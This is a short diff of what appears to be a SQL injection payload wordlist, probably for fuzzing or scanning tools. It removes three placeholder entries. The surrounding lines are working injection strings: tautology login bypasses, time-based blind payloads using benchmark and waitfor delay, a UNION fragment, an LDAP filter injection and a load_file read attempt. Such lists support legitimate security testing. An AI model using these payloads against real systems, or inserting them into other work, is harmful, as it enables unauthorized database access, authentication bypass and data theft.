@@ -54,8 +54,6 @@ admin' or '
 1) or benchmark(10000000,MD5(1))#
 \x27UNION SELECT
 declare @s varchar(200) select @s = 0x77616974 ...
-tz_offset
-sqlvuln
 "));waitfor delay '0:0:__TIME__'--
 or%201=1 --
 %2A%28%7C%28objectclass%3D%2A%29%29
@@ -64,7 +62,6 @@ or a=a
 PRINT @@variable
 or isNULL(1/0) /*
  or ""a""=""a"
-(sqlvuln)
 x' AND members.email IS NULL; --
  or 1=1--
  and 1=( if((load_file(char(110,46,101,120,11 ...
